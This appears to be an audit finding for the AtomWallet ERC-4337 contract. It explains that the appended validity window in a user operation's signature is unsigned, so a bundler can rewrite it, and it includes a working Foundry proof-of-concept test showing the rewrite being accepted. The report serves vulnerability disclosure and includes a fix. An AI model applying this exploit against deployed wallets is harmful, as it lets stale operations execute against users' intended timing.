  "body": "### Description\n\n`_validateSignature()` strips an optional `(validUntil, validAfter)` suffix from `userOp.signature`, but it only recovers the signer over `userOpHash`. Under ERC-4337 the EntryPoint hash excludes the signature bytes entirely, so a relayer can keep the same 65-byte ECDSA signature and rewrite the trailing validity window without invalidating the signature.\n\n### Impact\n\nA malicious bundler can execute an otherwise valid user operation earlier than `validAfter` or long after `validUntil`, bypassing the signer’s intended timing constraint. Any wallet action encoded in that user operation can then execute outside the user’s approved window.\n\n### Recommendation\n\nCryptographically bind `validUntil` and `validAfter` to the signed payload whenever a 77-byte signature is supplied, or move the validity-window fields into the signed user-operation struct itself.",
  "proof_of_concept": "### Proof of Concept\n\n1. A user signs a user operation with a short expiry.\n2. A bundler replaces the appended `validUntil` with a much later timestamp while keeping the same 65-byte signature.\n3. `validateUserOp()` still recovers the correct owner and returns the attacker-chosen window.\n4. The stale operation remains executable until the nonce is consumed.\n\n```\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { Test } from \"forge-std/src/Test.sol\";\nimport { TransparentUpgradeableProxy } from \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport { EntryPoint } from \"@account-abstraction/core/EntryPoint.sol\";\nimport { PackedUserOperation } from \"@account-abstraction/interfaces/PackedUserOperation.sol\";\nimport { ValidationData, _parseValidationData } from \"@account-abstraction/core/Helpers.sol\";\n\nimport { AtomWallet } from \"src/protocol/wallet/AtomWallet.sol\";\n\ncontract MockMultiVaultForAtomWallet {\n    address internal atomWarden;\n\n    constructor(address _atomWarden) {\n        atomWarden = _atomWarden;\n    }\n\n    function getAtomWarden() external view returns (address) {\n        return atomWarden;\n    }\n}\n\ncontract PoC_AtomWallet_UnsignedValidityWindow is Test {\n    uint256 internal constant OWNER_PRIVATE_KEY = 0xA11CE;\n\n    EntryPoint internal entryPoint;\n    AtomWallet internal wallet;\n\n    function setUp() public {\n        entryPoint = new EntryPoint();\n\n        MockMultiVaultForAtomWallet multiVault = new MockMultiVaultForAtomWallet(vm.addr(OWNER_PRIVATE_KEY));\n\n        AtomWallet implementation = new AtomWallet();\n        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(address(implementation), address(this), \"\");\n        wallet = AtomWallet(payable(address(proxy)));\n\n        wallet.initialize(address(entryPoint), address(multiVault), bytes32(\"ATOM\"));\n    }\n\n    function test_poc_relayerCanRewriteUnsignedValidityWindow() external {\n        PackedUserOperation memory userOp = PackedUserOperation({\n            sender: address(wallet),\n            nonce: 0,\n            initCode: \"\",\n            callData: \"\",\n            accountGasLimits: bytes32(0),\n            preVerificationGas: 0,\n            gasFees: bytes32(0),\n            paymasterAndData: \"\",\n            signature: \"\"\n        });\n\n        bytes32 userOpHash = entryPoint.getUserOpHash(userOp);\n        bytes memory rawSignature = _signUserOpHash(userOpHash);\n\n        uint48 originalValidUntil = uint48(block.timestamp + 1 hours);\n        uint48 originalValidAfter = uint48(block.timestamp);\n        userOp.signature = bytes.concat(rawSignature, abi.encodePacked(originalValidUntil, originalValidAfter));\n\n        bytes32 hashWithOriginalWindow = entryPoint.getUserOpHash(userOp);\n\n        uint48 attackerValidUntil = uint48(block.timestamp + 30 days);\n        uint48 attackerValidAfter = 0;\n        userOp.signature = bytes.concat(rawSignature, abi.encodePacked(attackerValidUntil, attackerValidAfter));\n\n        bytes32 hashWithModifiedWindow = entryPoint.getUserOpHash(userOp);\n        assertEq(hashWithOriginalWindow, hashWithModifiedWindow, \"EntryPoint hash must ignore signature bytes\");\n\n        vm.prank(address(entryPoint));\n        uint256 validationData = wallet.validateUserOp(userOp, userOpHash, 0);\n\n        ValidationData memory parsed = _parseValidationData(validationData);\n        assertEq(parsed.aggregator, address(0), \"signature should still validate\");\n        assertEq(parsed.validUntil, attackerValidUntil, \"attacker-controlled validUntil should be accepted\");\n        assertEq(parsed.validAfter, attackerValidAfter, \"attacker-controlled validAfter should be accepted\");\n\n        vm.warp(originalValidUntil + 1);\n        assertTrue(block.timestamp > originalValidUntil, \"original window should be expired\");\n        assertTrue(block.timestamp <= parsed.validUntil, \"rewritten window still keeps the op live\");\n    }\n\n    function _signUserOpHash(bytes32 userOpHash) internal returns (bytes memory) {\n        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", userOpHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_PRIVATE_KEY, ethSignedMessageHash);\n        return abi.encodePacked(r, s, v);\n    }\n}\n```",
